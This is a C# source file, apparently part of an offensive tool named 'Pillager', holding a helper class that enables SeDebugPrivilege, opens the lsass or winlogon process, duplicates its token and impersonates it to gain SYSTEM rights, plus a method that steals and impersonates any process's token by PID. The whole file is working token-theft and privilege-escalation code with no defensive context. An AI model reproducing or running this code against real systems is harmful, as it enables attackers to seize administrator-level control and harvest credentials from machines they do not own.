using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace Pillager.Helper
{
    internal class Impersonator

    {
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,
            ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess,
            IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool RevertToSelf();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [StructLayout(LayoutKind.Sequential)]
        private struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct TOKEN_PRIVILEGES
        {
            public int PrivilegeCount;
            public LUID Luid;
            public uint Attributes;
        }

        private const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        private const uint TOKEN_QUERY = 0x0008;
        private const uint TOKEN_DUPLICATE = 0x0002;
        private const uint MAXIMUM_ALLOWED = 0x02000000;
        private const uint TOKEN_ALL_ACCESS = 0x000F0000 | 0x0001 | 0x0020 | 0x0008;
        private const uint SE_PRIVILEGE_ENABLED = 0x00000002;
        private const string SE_DEBUG_NAME = "SeDebugPrivilege";
        private const uint PROCESS_QUERY_INFORMATION = 0x0400;
        private const int SecurityIdentification = 1;
        private const int TokenPrimary = 1;
        private const int SecurityDelegation = 3;

        public unsafe static bool GetSystemPrivileges()
        {
            IntPtr hToken = IntPtr.Zero;
            if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
            {
                Console.WriteLine("[-] Failed to open process token.");
                return false;
            }

            LUID luid;
            if (!LookupPrivilegeValue(null, SE_DEBUG_NAME, out luid))
            {
                Console.WriteLine("[-] Failed to lookup privilege value.");
                CloseHandle(hToken);
                return false;
            }

            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
            {
                PrivilegeCount = 1,
                Luid = luid,
                Attributes = SE_PRIVILEGE_ENABLED
            };

            if (!AdjustTokenPrivileges(hToken, false, ref tp, sizeof(TOKEN_PRIVILEGES), IntPtr.Zero, IntPtr.Zero))
            {
                Console.WriteLine("[-] Failed to adjust token privileges.");
                CloseHandle(hToken);
                return false;
            }

            CloseHandle(hToken);

            IntPtr hProcess = IntPtr.Zero;
            foreach (Process process in Process.GetProcesses())
            {
                if (process.ProcessName.Equals("lsass", StringComparison.OrdinalIgnoreCase) ||
                    process.ProcessName.Equals("winlogon", StringComparison.OrdinalIgnoreCase))
                {
                    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, process.Id);
                    if (hProcess != IntPtr.Zero) break;
                }
            }

            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to obtain system privileges.");
                return false;
            }

            IntPtr hTokenDuplicate;
            if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, out hTokenDuplicate))
            {
                CloseHandle(hProcess);
                Console.WriteLine("[-] Failed to open process token for duplication.");
                return false;
            }

            IntPtr hImpersonationToken;
            if (!DuplicateTokenEx(hTokenDuplicate, MAXIMUM_ALLOWED, IntPtr.Zero, SecurityIdentification, TokenPrimary, out hImpersonationToken))
            {
                Console.WriteLine("[-] Failed to duplicate token.");
                CloseHandle(hProcess);
                CloseHandle(hTokenDuplicate);
                return false;
            }

            if (!ImpersonateLoggedOnUser(hImpersonationToken))
            {
                Console.WriteLine("[-] Failed to impersonate logged on user.");
                CloseHandle(hProcess);
                CloseHandle(hTokenDuplicate);
                CloseHandle(hImpersonationToken);
                return false;
            }

            CloseHandle(hProcess);
            CloseHandle(hTokenDuplicate);
            return true;
        }

        public static void IdentityStealToken(int pid)
        {
            IntPtr hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid);
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine($"[-] Could not open process {pid}: {Marshal.GetLastWin32Error()}");
                return;
            }

            IntPtr hToken;
            if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, out hToken))
            {
                Console.WriteLine($"[-] Could not open process token: {Marshal.GetLastWin32Error()}");
                CloseHandle(hProcess);
                return;
            }

            RevertToSelf();

            if (!ImpersonateLoggedOnUser(hToken))
            {
                Console.WriteLine($"[-] Failed to impersonate token from process {pid}: {Marshal.GetLastWin32Error()}");
                CloseHandle(hToken);
                CloseHandle(hProcess);
                return;
            }

            IntPtr gIdentityToken;
            if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, SecurityDelegation, TokenPrimary, out gIdentityToken))
            {
                Console.WriteLine($"[-] Failed to duplicate token from process {pid}: {Marshal.GetLastWin32Error()}");
                CloseHandle(hToken);
                CloseHandle(hProcess);
                return;
            }

            if (!ImpersonateLoggedOnUser(gIdentityToken))
            {
                Console.WriteLine($"[-] Failed to impersonate logged on user {pid}: {Marshal.GetLastWin32Error()}");
                CloseHandle(gIdentityToken);
            }

            CloseHandle(hProcess);
            CloseHandle(hToken);
        }
    }
}
